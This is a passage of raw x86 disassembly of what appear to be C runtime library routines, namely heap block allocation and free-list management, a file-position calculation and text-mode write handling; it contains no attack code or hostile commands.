  431b30:	mov    edi,DWORD PTR [edi+0x8]
  431b33:	mov    DWORD PTR [ecx+0x8],edi
  431b36:	mov    ecx,DWORD PTR [ebp+0x10]
  431b39:	sub    ecx,esi
  431b3b:	add    DWORD PTR [ebp-0x4],ecx
  431b3e:	cmp    DWORD PTR [ebp-0x4],0x0
  431b42:	jle    0x431bed
  431b48:	mov    edi,DWORD PTR [ebp-0x4]
  431b4b:	mov    ecx,DWORD PTR [ebp+0xc]
  431b4e:	sar    edi,0x4
  431b51:	dec    edi
  431b52:	cmp    edi,0x3f
  431b55:	lea    ecx,[ecx+esi*1-0x4]
  431b59:	jbe    0x431b5e
  431b5b:	push   0x3f
  431b5d:	pop    edi
  431b5e:	mov    ebx,DWORD PTR [ebp-0xc]
  431b61:	lea    ebx,[ebx+edi*8]
  431b64:	mov    DWORD PTR [ebp+0x10],ebx
  431b67:	mov    ebx,DWORD PTR [ebx+0x4]
  431b6a:	mov    DWORD PTR [ecx+0x4],ebx
  431b6d:	mov    ebx,DWORD PTR [ebp+0x10]
  431b70:	mov    DWORD PTR [ecx+0x8],ebx
  431b73:	mov    DWORD PTR [ebx+0x4],ecx
  431b76:	mov    ebx,DWORD PTR [ecx+0x4]
  431b79:	mov    DWORD PTR [ebx+0x8],ecx
  431b7c:	mov    ebx,DWORD PTR [ecx+0x4]
  431b7f:	cmp    ebx,DWORD PTR [ecx+0x8]
  431b82:	jne    0x431bdb
  431b84:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  431b88:	mov    BYTE PTR [ebp+0x13],cl
  431b8b:	inc    cl
  431b8d:	cmp    edi,0x20
  431b90:	mov    BYTE PTR [edi+eax*1+0x4],cl
  431b94:	jae    0x431bb2
  431b96:	cmp    BYTE PTR [ebp+0x13],0x0
  431b9a:	jne    0x431baa
  431b9c:	mov    ecx,edi
  431b9e:	mov    ebx,0x80000000
  431ba3:	shr    ebx,cl
  431ba5:	mov    ecx,DWORD PTR [ebp+0x8]
  431ba8:	or     DWORD PTR [ecx],ebx
  431baa:	lea    eax,[eax+edx*4+0x44]
  431bae:	mov    ecx,edi
  431bb0:	jmp    0x431bd2
  431bb2:	cmp    BYTE PTR [ebp+0x13],0x0
  431bb6:	jne    0x431bc8
  431bb8:	lea    ecx,[edi-0x20]
  431bbb:	mov    ebx,0x80000000
  431bc0:	shr    ebx,cl
  431bc2:	mov    ecx,DWORD PTR [ebp+0x8]
  431bc5:	or     DWORD PTR [ecx+0x4],ebx
  431bc8:	lea    eax,[eax+edx*4+0xc4]
  431bcf:	lea    ecx,[edi-0x20]
  431bd2:	mov    edx,0x80000000
  431bd7:	shr    edx,cl
  431bd9:	or     DWORD PTR [eax],edx
  431bdb:	mov    edx,DWORD PTR [ebp+0xc]
  431bde:	mov    ecx,DWORD PTR [ebp-0x4]
  431be1:	lea    eax,[edx+esi*1-0x4]
  431be5:	mov    DWORD PTR [eax],ecx
  431be7:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  431beb:	jmp    0x431bf0
  431bed:	mov    edx,DWORD PTR [ebp+0xc]
  431bf0:	lea    eax,[esi+0x1]
  431bf3:	mov    DWORD PTR [edx-0x4],eax
  431bf6:	mov    DWORD PTR [edx+esi*1-0x8],eax
  431bfa:	jmp    0x431d3b
  431bff:	xor    eax,eax
  431c01:	jmp    0x431d3e
  431c06:	jge    0x431d3b
  431c0c:	mov    ebx,DWORD PTR [ebp+0xc]
  431c0f:	sub    DWORD PTR [ebp+0x10],esi
  431c12:	lea    ecx,[esi+0x1]
  431c15:	mov    DWORD PTR [ebx-0x4],ecx
  431c18:	lea    ebx,[ebx+esi*1-0x4]
  431c1c:	mov    esi,DWORD PTR [ebp+0x10]
  431c1f:	sar    esi,0x4
  431c22:	dec    esi
  431c23:	cmp    esi,0x3f
  431c26:	mov    DWORD PTR [ebp+0xc],ebx
  431c29:	mov    DWORD PTR [ebx-0x4],ecx
  431c2c:	jbe    0x431c31
  431c2e:	push   0x3f
  431c30:	pop    esi
  431c31:	test   BYTE PTR [ebp-0x4],0x1
  431c35:	jne    0x431cbb
  431c3b:	mov    esi,DWORD PTR [ebp-0x4]
  431c3e:	sar    esi,0x4
  431c41:	dec    esi
  431c42:	cmp    esi,0x3f
  431c45:	jbe    0x431c4a
  431c47:	push   0x3f
  431c49:	pop    esi
  431c4a:	mov    ecx,DWORD PTR [edi+0x4]
  431c4d:	cmp    ecx,DWORD PTR [edi+0x8]
  431c50:	jne    0x431c94
  431c52:	cmp    esi,0x20
  431c55:	mov    ebx,0x80000000
  431c5a:	jae    0x431c75
  431c5c:	mov    ecx,esi
  431c5e:	shr    ebx,cl
  431c60:	lea    esi,[esi+eax*1+0x4]
  431c64:	not    ebx
  431c66:	and    DWORD PTR [eax+edx*4+0x44],ebx
  431c6a:	dec    BYTE PTR [esi]
  431c6c:	jne    0x431c91
  431c6e:	mov    ecx,DWORD PTR [ebp+0x8]
  431c71:	and    DWORD PTR [ecx],ebx
  431c73:	jmp    0x431c91
  431c75:	lea    ecx,[esi-0x20]
  431c78:	shr    ebx,cl
  431c7a:	lea    ecx,[esi+eax*1+0x4]
  431c7e:	not    ebx
  431c80:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  431c87:	dec    BYTE PTR [ecx]
  431c89:	jne    0x431c91
  431c8b:	mov    ecx,DWORD PTR [ebp+0x8]
  431c8e:	and    DWORD PTR [ecx+0x4],ebx
  431c91:	mov    ebx,DWORD PTR [ebp+0xc]
  431c94:	mov    ecx,DWORD PTR [edi+0x8]
  431c97:	mov    esi,DWORD PTR [edi+0x4]
  431c9a:	mov    DWORD PTR [ecx+0x4],esi
  431c9d:	mov    esi,DWORD PTR [edi+0x8]
  431ca0:	mov    ecx,DWORD PTR [edi+0x4]
  431ca3:	mov    DWORD PTR [ecx+0x8],esi
  431ca6:	mov    esi,DWORD PTR [ebp+0x10]
  431ca9:	add    esi,DWORD PTR [ebp-0x4]
  431cac:	mov    DWORD PTR [ebp+0x10],esi
  431caf:	sar    esi,0x4
  431cb2:	dec    esi
  431cb3:	cmp    esi,0x3f
  431cb6:	jbe    0x431cbb
  431cb8:	push   0x3f
  431cba:	pop    esi
  431cbb:	mov    ecx,DWORD PTR [ebp-0xc]
  431cbe:	lea    ecx,[ecx+esi*8]
  431cc1:	mov    edi,DWORD PTR [ecx+0x4]
  431cc4:	mov    DWORD PTR [ebx+0x8],ecx
  431cc7:	mov    DWORD PTR [ebx+0x4],edi
  431cca:	mov    DWORD PTR [ecx+0x4],ebx
  431ccd:	mov    ecx,DWORD PTR [ebx+0x4]
  431cd0:	mov    DWORD PTR [ecx+0x8],ebx
  431cd3:	mov    ecx,DWORD PTR [ebx+0x4]
  431cd6:	cmp    ecx,DWORD PTR [ebx+0x8]
  431cd9:	jne    0x431d32
  431cdb:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  431cdf:	mov    BYTE PTR [ebp+0xf],cl
  431ce2:	inc    cl
  431ce4:	cmp    esi,0x20
  431ce7:	mov    BYTE PTR [esi+eax*1+0x4],cl
  431ceb:	jae    0x431d09
  431ced:	cmp    BYTE PTR [ebp+0xf],0x0
  431cf1:	jne    0x431d01
  431cf3:	mov    ecx,esi
  431cf5:	mov    edi,0x80000000
  431cfa:	shr    edi,cl
  431cfc:	mov    ecx,DWORD PTR [ebp+0x8]
  431cff:	or     DWORD PTR [ecx],edi
  431d01:	lea    eax,[eax+edx*4+0x44]
  431d05:	mov    ecx,esi
  431d07:	jmp    0x431d29
  431d09:	cmp    BYTE PTR [ebp+0xf],0x0
  431d0d:	jne    0x431d1f
  431d0f:	lea    ecx,[esi-0x20]
  431d12:	mov    edi,0x80000000
  431d17:	shr    edi,cl
  431d19:	mov    ecx,DWORD PTR [ebp+0x8]
  431d1c:	or     DWORD PTR [ecx+0x4],edi
  431d1f:	lea    eax,[eax+edx*4+0xc4]
  431d26:	lea    ecx,[esi-0x20]
  431d29:	mov    edx,0x80000000
  431d2e:	shr    edx,cl
  431d30:	or     DWORD PTR [eax],edx
  431d32:	mov    eax,DWORD PTR [ebp+0x10]
  431d35:	mov    DWORD PTR [ebx],eax
  431d37:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  431d3b:	xor    eax,eax
  431d3d:	inc    eax
  431d3e:	pop    edi
  431d3f:	pop    esi
  431d40:	pop    ebx
  431d41:	leave  
  431d42:	ret    
  431d43:	push   ebp
  431d44:	mov    ebp,esp
  431d46:	sub    esp,0x14
  431d49:	mov    ecx,DWORD PTR [ebp+0x8]
  431d4c:	mov    eax,ds:0x465218
  431d51:	mov    edx,DWORD PTR ds:0x46521c
  431d57:	add    ecx,0x17
  431d5a:	and    ecx,0xfffffff0
  431d5d:	push   ebx
  431d5e:	mov    DWORD PTR [ebp-0x10],ecx
  431d61:	sar    ecx,0x4
  431d64:	push   esi
  431d65:	lea    eax,[eax+eax*4]
  431d68:	push   edi
  431d69:	dec    ecx
  431d6a:	cmp    ecx,0x20
  431d6d:	lea    edi,[edx+eax*4]
  431d70:	mov    DWORD PTR [ebp-0x4],edi
  431d73:	jge    0x431d80
  431d75:	or     esi,0xffffffff
  431d78:	shr    esi,cl
  431d7a:	or     DWORD PTR [ebp-0x8],0xffffffff
  431d7e:	jmp    0x431d8d
  431d80:	add    ecx,0xffffffe0
  431d83:	or     eax,0xffffffff
  431d86:	xor    esi,esi
  431d88:	shr    eax,cl
  431d8a:	mov    DWORD PTR [ebp-0x8],eax
  431d8d:	mov    eax,ds:0x465224
  431d92:	mov    ebx,eax
  431d94:	mov    DWORD PTR [ebp-0xc],esi
  431d97:	cmp    ebx,edi
  431d99:	jmp    0x431daf
  431d9b:	mov    ecx,DWORD PTR [ebx+0x4]
  431d9e:	mov    edi,DWORD PTR [ebx]
  431da0:	and    ecx,DWORD PTR [ebp-0x8]
  431da3:	and    edi,esi
  431da5:	or     ecx,edi
  431da7:	jne    0x431db4
  431da9:	add    ebx,0x14
  431dac:	cmp    ebx,DWORD PTR [ebp-0x4]
  431daf:	mov    DWORD PTR [ebp+0x8],ebx
  431db2:	jb     0x431d9b
  431db4:	cmp    ebx,DWORD PTR [ebp-0x4]
  431db7:	jne    0x431ddd
  431db9:	mov    ebx,edx
  431dbb:	jmp    0x431dce
  431dbd:	mov    ecx,DWORD PTR [ebx+0x4]
  431dc0:	mov    edi,DWORD PTR [ebx]
  431dc2:	and    ecx,DWORD PTR [ebp-0x8]
  431dc5:	and    edi,esi
  431dc7:	or     ecx,edi
  431dc9:	jne    0x431dd5
  431dcb:	add    ebx,0x14
  431dce:	cmp    ebx,eax
  431dd0:	mov    DWORD PTR [ebp+0x8],ebx
  431dd3:	jb     0x431dbd
  431dd5:	cmp    ebx,eax
  431dd7:	je     0x431e71
  431ddd:	mov    DWORD PTR ds:0x465224,ebx
  431de3:	mov    eax,DWORD PTR [ebx+0x10]
  431de6:	mov    edx,DWORD PTR [eax]
  431de8:	cmp    edx,0xffffffff
  431deb:	mov    DWORD PTR [ebp-0x4],edx
  431dee:	je     0x431e04
  431df0:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  431df7:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  431dfb:	and    ecx,DWORD PTR [ebp-0x8]
  431dfe:	and    edi,esi
  431e00:	or     ecx,edi
  431e02:	jne    0x431e3a
  431e04:	mov    edx,DWORD PTR [eax+0xc4]
  431e0a:	and    edx,DWORD PTR [ebp-0x8]
  431e0d:	and    DWORD PTR [ebp-0x4],0x0
  431e11:	lea    ecx,[eax+0x44]
  431e14:	mov    esi,DWORD PTR [ecx]
  431e16:	and    esi,DWORD PTR [ebp-0xc]
  431e19:	or     edx,esi
  431e1b:	mov    esi,DWORD PTR [ebp-0xc]
  431e1e:	jne    0x431e37
  431e20:	mov    edx,DWORD PTR [ecx+0x84]
  431e26:	and    edx,DWORD PTR [ebp-0x8]
  431e29:	inc    DWORD PTR [ebp-0x4]
  431e2c:	add    ecx,0x4
  431e2f:	mov    edi,DWORD PTR [ecx]
  431e31:	and    edi,esi
  431e33:	or     edx,edi
  431e35:	je     0x431e20
  431e37:	mov    edx,DWORD PTR [ebp-0x4]
  431e3a:	mov    ecx,edx
  431e3c:	imul   ecx,ecx,0x204
  431e42:	lea    ecx,[ecx+eax*1+0x144]
  431e49:	mov    DWORD PTR [ebp-0xc],ecx
  431e4c:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  431e50:	xor    edi,edi
  431e52:	and    ecx,esi
  431e54:	jne    0x431ec3
  431e56:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  431e5d:	and    ecx,DWORD PTR [ebp-0x8]
  431e60:	push   0x20
  431e62:	pop    edi
  431e63:	jmp    0x431ec3
  431e65:	cmp    DWORD PTR [ebx+0x8],0x0
  431e69:	jne    0x431e76
  431e6b:	add    ebx,0x14
  431e6e:	mov    DWORD PTR [ebp+0x8],ebx
  431e71:	cmp    ebx,DWORD PTR [ebp-0x4]
  431e74:	jb     0x431e65
  431e76:	cmp    ebx,DWORD PTR [ebp-0x4]
  431e79:	jne    0x431ea1
  431e7b:	mov    ebx,edx
  431e7d:	jmp    0x431e88
  431e7f:	cmp    DWORD PTR [ebx+0x8],0x0
  431e83:	jne    0x431e8f
  431e85:	add    ebx,0x14
  431e88:	cmp    ebx,eax
  431e8a:	mov    DWORD PTR [ebp+0x8],ebx
  431e8d:	jb     0x431e7f
  431e8f:	cmp    ebx,eax
  431e91:	jne    0x431ea1
  431e93:	call   0x4318a7
  431e98:	mov    ebx,eax
  431e9a:	test   ebx,ebx
  431e9c:	mov    DWORD PTR [ebp+0x8],ebx
  431e9f:	je     0x431eb9
  431ea1:	push   ebx
  431ea2:	call   0x43195e
  431ea7:	pop    ecx
  431ea8:	mov    ecx,DWORD PTR [ebx+0x10]
  431eab:	mov    DWORD PTR [ecx],eax
  431ead:	mov    eax,DWORD PTR [ebx+0x10]
  431eb0:	cmp    DWORD PTR [eax],0xffffffff
  431eb3:	jne    0x431ddd
  431eb9:	xor    eax,eax
  431ebb:	jmp    0x43203a
  431ec0:	shl    ecx,1
  431ec2:	inc    edi
  431ec3:	test   ecx,ecx
  431ec5:	jge    0x431ec0
  431ec7:	mov    ecx,DWORD PTR [ebp-0xc]
  431eca:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  431ece:	mov    ecx,DWORD PTR [edx]
  431ed0:	sub    ecx,DWORD PTR [ebp-0x10]
  431ed3:	mov    esi,ecx
  431ed5:	sar    esi,0x4
  431ed8:	dec    esi
  431ed9:	cmp    esi,0x3f
  431edc:	mov    DWORD PTR [ebp-0x8],ecx
  431edf:	jle    0x431ee4
  431ee1:	push   0x3f
  431ee3:	pop    esi
  431ee4:	cmp    esi,edi
  431ee6:	je     0x431fed
  431eec:	mov    ecx,DWORD PTR [edx+0x4]
  431eef:	cmp    ecx,DWORD PTR [edx+0x8]
  431ef2:	jne    0x431f50
  431ef4:	cmp    edi,0x20
  431ef7:	mov    ebx,0x80000000
  431efc:	jge    0x431f24
  431efe:	mov    ecx,edi
  431f00:	shr    ebx,cl
  431f02:	mov    ecx,DWORD PTR [ebp-0x4]
  431f05:	lea    edi,[eax+edi*1+0x4]
  431f09:	not    ebx
  431f0b:	mov    DWORD PTR [ebp-0x14],ebx
  431f0e:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  431f12:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  431f16:	dec    BYTE PTR [edi]
  431f18:	jne    0x431f4d
  431f1a:	mov    ecx,DWORD PTR [ebp-0x14]
  431f1d:	mov    ebx,DWORD PTR [ebp+0x8]
  431f20:	and    DWORD PTR [ebx],ecx
  431f22:	jmp    0x431f50
  431f24:	lea    ecx,[edi-0x20]
  431f27:	shr    ebx,cl
  431f29:	mov    ecx,DWORD PTR [ebp-0x4]
  431f2c:	lea    ecx,[eax+ecx*4+0xc4]
  431f33:	lea    edi,[eax+edi*1+0x4]
  431f37:	not    ebx
  431f39:	and    DWORD PTR [ecx],ebx
  431f3b:	dec    BYTE PTR [edi]
  431f3d:	mov    DWORD PTR [ebp-0x14],ebx
  431f40:	jne    0x431f4d
  431f42:	mov    ebx,DWORD PTR [ebp+0x8]
  431f45:	mov    ecx,DWORD PTR [ebp-0x14]
  431f48:	and    DWORD PTR [ebx+0x4],ecx
  431f4b:	jmp    0x431f50
  431f4d:	mov    ebx,DWORD PTR [ebp+0x8]
  431f50:	cmp    DWORD PTR [ebp-0x8],0x0
  431f54:	mov    ecx,DWORD PTR [edx+0x8]
  431f57:	mov    edi,DWORD PTR [edx+0x4]
  431f5a:	mov    DWORD PTR [ecx+0x4],edi
  431f5d:	mov    ecx,DWORD PTR [edx+0x4]
  431f60:	mov    edi,DWORD PTR [edx+0x8]
  431f63:	mov    DWORD PTR [ecx+0x8],edi
  431f66:	je     0x431ff9
  431f6c:	mov    ecx,DWORD PTR [ebp-0xc]
  431f6f:	lea    ecx,[ecx+esi*8]
  431f72:	mov    edi,DWORD PTR [ecx+0x4]
  431f75:	mov    DWORD PTR [edx+0x8],ecx
  431f78:	mov    DWORD PTR [edx+0x4],edi
  431f7b:	mov    DWORD PTR [ecx+0x4],edx
  431f7e:	mov    ecx,DWORD PTR [edx+0x4]
  431f81:	mov    DWORD PTR [ecx+0x8],edx
  431f84:	mov    ecx,DWORD PTR [edx+0x4]
  431f87:	cmp    ecx,DWORD PTR [edx+0x8]
  431f8a:	jne    0x431fea
  431f8c:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  431f90:	mov    BYTE PTR [ebp+0xb],cl
  431f93:	inc    cl
  431f95:	cmp    esi,0x20
  431f98:	mov    BYTE PTR [esi+eax*1+0x4],cl
  431f9c:	jge    0x431fc1
  431f9e:	cmp    BYTE PTR [ebp+0xb],0x0
  431fa2:	jne    0x431faf
  431fa4:	mov    edi,0x80000000
  431fa9:	mov    ecx,esi
  431fab:	shr    edi,cl
  431fad:	or     DWORD PTR [ebx],edi
  431faf:	mov    ecx,esi
  431fb1:	mov    edi,0x80000000
  431fb6:	shr    edi,cl
  431fb8:	mov    ecx,DWORD PTR [ebp-0x4]
  431fbb:	or     DWORD PTR [eax+ecx*4+0x44],edi
  431fbf:	jmp    0x431fea
  431fc1:	cmp    BYTE PTR [ebp+0xb],0x0
  431fc5:	jne    0x431fd4
  431fc7:	lea    ecx,[esi-0x20]
  431fca:	mov    edi,0x80000000
  431fcf:	shr    edi,cl
  431fd1:	or     DWORD PTR [ebx+0x4],edi
  431fd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431fd7:	lea    edi,[eax+ecx*4+0xc4]
  431fde:	lea    ecx,[esi-0x20]
  431fe1:	mov    esi,0x80000000
  431fe6:	shr    esi,cl
  431fe8:	or     DWORD PTR [edi],esi
  431fea:	mov    ecx,DWORD PTR [ebp-0x8]
  431fed:	test   ecx,ecx
  431fef:	je     0x431ffc
  431ff1:	mov    DWORD PTR [edx],ecx
  431ff3:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  431ff7:	jmp    0x431ffc
  431ff9:	mov    ecx,DWORD PTR [ebp-0x8]
  431ffc:	mov    esi,DWORD PTR [ebp-0x10]
  431fff:	add    edx,ecx
  432001:	lea    ecx,[esi+0x1]
  432004:	mov    DWORD PTR [edx],ecx
  432006:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  43200a:	mov    esi,DWORD PTR [ebp-0xc]
  43200d:	mov    ecx,DWORD PTR [esi]
  43200f:	test   ecx,ecx
  432011:	lea    edi,[ecx+0x1]
  432014:	mov    DWORD PTR [esi],edi
  432016:	jne    0x432032
  432018:	cmp    ebx,DWORD PTR ds:0x465214
  43201e:	jne    0x432032
  432020:	mov    ecx,DWORD PTR [ebp-0x4]
  432023:	cmp    ecx,DWORD PTR ds:0x46522c
  432029:	jne    0x432032
  43202b:	and    DWORD PTR ds:0x465214,0x0
  432032:	mov    ecx,DWORD PTR [ebp-0x4]
  432035:	mov    DWORD PTR [eax],ecx
  432037:	lea    eax,[edx+0x4]
  43203a:	pop    edi
  43203b:	pop    esi
  43203c:	pop    ebx
  43203d:	leave  
  43203e:	ret    
  43203f:	inc    DWORD PTR ds:0x43fb44
  432045:	push   0x1000
  43204a:	call   0x4311fe
  43204f:	test   eax,eax
  432051:	pop    ecx
  432052:	mov    ecx,DWORD PTR [esp+0x4]
  432056:	mov    DWORD PTR [ecx+0x8],eax
  432059:	je     0x432068
  43205b:	or     DWORD PTR [ecx+0xc],0x8
  43205f:	mov    DWORD PTR [ecx+0x18],0x1000
  432066:	jmp    0x432079
  432068:	or     DWORD PTR [ecx+0xc],0x4
  43206c:	lea    eax,[ecx+0x14]
  43206f:	mov    DWORD PTR [ecx+0x8],eax
  432072:	mov    DWORD PTR [ecx+0x18],0x2
  432079:	mov    eax,DWORD PTR [ecx+0x8]
  43207c:	and    DWORD PTR [ecx+0x4],0x0
  432080:	mov    DWORD PTR [ecx],eax
  432082:	ret    
  432083:	push   ebp
  432084:	mov    ebp,esp
  432086:	sub    esp,0x10
  432089:	push   ebx
  43208a:	push   esi
  43208b:	push   edi
  43208c:	mov    edi,DWORD PTR [ebp+0x8]
  43208f:	mov    esi,DWORD PTR [edi+0x10]
  432092:	xor    eax,eax
  432094:	cmp    DWORD PTR [edi+0x4],eax
  432097:	mov    DWORD PTR [ebp-0x8],esi
  43209a:	jge    0x43209f
  43209c:	mov    DWORD PTR [edi+0x4],eax
  43209f:	push   0x1
  4320a1:	push   eax
  4320a2:	push   eax
  4320a3:	push   esi
  4320a4:	call   0x4365ff
  4320a9:	mov    ecx,edx
  4320ab:	add    esp,0x10
  4320ae:	test   ecx,ecx
  4320b0:	mov    ebx,eax
  4320b2:	mov    DWORD PTR [ebp-0x10],ebx
  4320b5:	mov    DWORD PTR [ebp-0xc],ecx
  4320b8:	jg     0x4320c4
  4320ba:	jl     0x432140
  4320c0:	test   ebx,ebx
  4320c2:	jb     0x432140
  4320c4:	test   WORD PTR [edi+0xc],0x108
  4320ca:	jne    0x4320dd
  4320cc:	mov    eax,DWORD PTR [edi+0x4]
  4320cf:	cdq    
  4320d0:	sub    ebx,eax
  4320d2:	sbb    ecx,edx
  4320d4:	mov    eax,ebx
  4320d6:	mov    edx,ecx
  4320d8:	jmp    0x432213
  4320dd:	mov    eax,DWORD PTR [edi]
  4320df:	mov    edx,DWORD PTR [edi+0x8]
  4320e2:	mov    ecx,eax
  4320e4:	sub    ecx,edx
  4320e6:	mov    DWORD PTR [ebp-0x4],ecx
  4320e9:	mov    ecx,DWORD PTR [edi+0xc]
  4320ec:	test   cl,0x3
  4320ef:	je     0x432131
  4320f1:	mov    ebx,esi
  4320f3:	mov    ecx,esi
  4320f5:	sar    ebx,0x5
  4320f8:	mov    ebx,DWORD PTR [ebx*4+0x465100]
  4320ff:	and    ecx,0x1f
  432102:	lea    ecx,[ecx+ecx*8]
  432105:	test   BYTE PTR [ebx+ecx*4+0x4],0x80
  43210a:	je     0x43211f
  43210c:	mov    ecx,edx
  43210e:	cmp    ecx,eax
  432110:	jae    0x43211f
  432112:	cmp    BYTE PTR [ecx],0xa
  432115:	jne    0x43211a
  432117:	inc    DWORD PTR [ebp-0x4]
  43211a:	inc    ecx
  43211b:	cmp    ecx,DWORD PTR [edi]
  43211d:	jb     0x432112
  43211f:	mov    ebx,DWORD PTR [ebp-0x10]
  432122:	or     ebx,DWORD PTR [ebp-0xc]
  432125:	jne    0x43214a
  432127:	mov    eax,DWORD PTR [ebp-0x4]
  43212a:	xor    edx,edx
  43212c:	jmp    0x432213
  432131:	test   cl,cl
  432133:	js     0x432122
  432135:	call   0x432878
  43213a:	mov    DWORD PTR [eax],0x16
  432140:	or     edx,0xffffffff
  432143:	mov    eax,edx
  432145:	jmp    0x432213
  43214a:	test   BYTE PTR [edi+0xc],0x1
  43214e:	je     0x432208
  432154:	mov    ecx,DWORD PTR [edi+0x4]
  432157:	test   ecx,ecx
  432159:	jne    0x432163
  43215b:	and    DWORD PTR [ebp-0x4],ecx
  43215e:	jmp    0x432208
  432163:	sub    eax,edx
  432165:	add    eax,ecx
  432167:	mov    DWORD PTR [ebp+0x8],eax
  43216a:	mov    eax,esi
  43216c:	sar    eax,0x5
  43216f:	lea    ebx,[eax*4+0x465100]
  432176:	mov    eax,esi
  432178:	and    eax,0x1f
  43217b:	lea    esi,[eax+eax*8]
  43217e:	mov    eax,DWORD PTR [ebx]
  432180:	shl    esi,0x2
  432183:	test   BYTE PTR [esi+eax*1+0x4],0x80
  432188:	je     0x4321fe
  43218a:	push   0x2
  43218c:	push   0x0
  43218e:	push   0x0
  432190:	push   DWORD PTR [ebp-0x8]
  432193:	call   0x4365ff
  432198:	add    esp,0x10
  43219b:	cmp    eax,DWORD PTR [ebp-0x10]
  43219e:	jne    0x4321c2
  4321a0:	cmp    edx,DWORD PTR [ebp-0xc]
  4321a3:	jne    0x4321c2
  4321a5:	mov    eax,DWORD PTR [edi+0x8]
  4321a8:	mov    ecx,DWORD PTR [ebp+0x8]
  4321ab:	add    ecx,eax
  4321ad:	jmp    0x4321b8
  4321af:	cmp    BYTE PTR [eax],0xa
  4321b2:	jne    0x4321b7
  4321b4:	inc    DWORD PTR [ebp+0x8]
  4321b7:	inc    eax
  4321b8:	cmp    eax,ecx
  4321ba:	jb     0x4321af
  4321bc:	test   BYTE PTR [edi+0xd],0x20
  4321c0:	jmp    0x4321f9
  4321c2:	push   0x0
  4321c4:	push   DWORD PTR [ebp-0xc]
  4321c7:	push   DWORD PTR [ebp-0x10]
  4321ca:	push   DWORD PTR [ebp-0x8]
  4321cd:	call   0x4365ff
  4321d2:	mov    eax,0x200
  4321d7:	add    esp,0x10
  4321da:	cmp    DWORD PTR [ebp+0x8],eax
  4321dd:	ja     0x4321ec
  4321df:	mov    ecx,DWORD PTR [edi+0xc]
  4321e2:	test   cl,0x8
  4321e5:	je     0x4321ec
  4321e7:	test   ch,0x4
  4321ea:	je     0x4321ef
  4321ec:	mov    eax,DWORD PTR [edi+0x18]
  4321ef:	mov    DWORD PTR [ebp+0x8],eax
  4321f2:	mov    eax,DWORD PTR [ebx]
  4321f4:	test   BYTE PTR [esi+eax*1+0x4],0x4
  4321f9:	je     0x4321fe
  4321fb:	inc    DWORD PTR [ebp+0x8]
  4321fe:	mov    eax,DWORD PTR [ebp+0x8]
  432201:	sub    DWORD PTR [ebp-0x10],eax
  432204:	sbb    DWORD PTR [ebp-0xc],0x0
  432208:	mov    eax,DWORD PTR [ebp-0x4]
  43220b:	xor    edx,edx
  43220d:	add    eax,DWORD PTR [ebp-0x10]
  432210:	adc    edx,DWORD PTR [ebp-0xc]
  432213:	pop    edi
  432214:	pop    esi
  432215:	pop    ebx
  432216:	leave  
  432217:	ret    
  432218:	push   0x10
  43221a:	push   0x439cb8
  43221f:	call   0x431210
  432224:	push   DWORD PTR [ebp+0x8]
  432227:	call   0x42f3b5
  43222c:	pop    ecx
  43222d:	and    DWORD PTR [ebp-0x4],0x0
  432231:	push   DWORD PTR [ebp+0x8]
  432234:	call   0x432083
  432239:	pop    ecx
  43223a:	mov    DWORD PTR [ebp-0x20],eax
  43223d:	mov    DWORD PTR [ebp-0x1c],edx
  432240:	or     DWORD PTR [ebp-0x4],0xffffffff
  432244:	call   0x432255
  432249:	mov    eax,DWORD PTR [ebp-0x20]
  43224c:	mov    edx,DWORD PTR [ebp-0x1c]
  43224f:	call   0x43124b
  432254:	ret    
  432255:	push   DWORD PTR [ebp+0x8]
  432258:	call   0x42f407
  43225d:	pop    ecx
  43225e:	ret    
  43225f:	push   ebp
  432260:	lea    ebp,[esp-0x3a0]
  432267:	sub    esp,0x420
  43226d:	mov    eax,ds:0x43d404
  432272:	push   edi
  432273:	xor    edi,edi
  432275:	cmp    DWORD PTR [ebp+0x3b0],edi
  43227b:	mov    DWORD PTR [ebp+0x39c],eax
  432281:	mov    DWORD PTR [ebp-0x78],edi
  432284:	mov    DWORD PTR [ebp-0x7c],edi
  432287:	jne    0x432290
  432289:	xor    eax,eax
  43228b:	jmp    0x432419
  432290:	mov    eax,DWORD PTR [ebp+0x3a8]
  432296:	push   ebx
  432297:	mov    ebx,DWORD PTR [ebp+0x3a8]
  43229d:	and    eax,0x1f
  4322a0:	sar    ebx,0x5
  4322a3:	push   esi
  4322a4:	lea    esi,[eax+eax*8]
  4322a7:	lea    ebx,[ebx*4+0x465100]
  4322ae:	mov    eax,DWORD PTR [ebx]
  4322b0:	shl    esi,0x2
  4322b3:	test   BYTE PTR [eax+esi*1+0x4],0x20
  4322b8:	je     0x4322cc
  4322ba:	push   0x2
  4322bc:	push   edi
  4322bd:	push   edi
  4322be:	push   DWORD PTR [ebp+0x3a8]
  4322c4:	call   0x43657c
  4322c9:	add    esp,0x10
  4322cc:	mov    eax,DWORD PTR [ebx]
  4322ce:	add    eax,esi
  4322d0:	test   BYTE PTR [eax+0x4],0x80
  4322d4:	je     0x4323a7
  4322da:	cmp    DWORD PTR [ebp+0x3b0],edi
  4322e0:	mov    eax,DWORD PTR [ebp+0x3ac]
  4322e6:	mov    DWORD PTR [ebp-0x74],eax
  4322e9:	mov    DWORD PTR [ebp-0x6c],edi
  4322ec:	jbe    0x4323e5
  4322f2:	mov    ecx,DWORD PTR [ebp-0x74]
  4322f5:	sub    ecx,DWORD PTR [ebp+0x3ac]
  4322fb:	lea    eax,[ebp-0x68]
  4322fe:	mov    DWORD PTR [ebp-0x70],edi
  432301:	cmp    ecx,DWORD PTR [ebp+0x3b0]
  432307:	jae    0x432330
  432309:	mov    edx,DWORD PTR [ebp-0x74]
  43230c:	inc    DWORD PTR [ebp-0x74]
  43230f:	mov    dl,BYTE PTR [edx]
  432311:	inc    ecx
  432312:	cmp    dl,0xa
  432315:	jne    0x432321
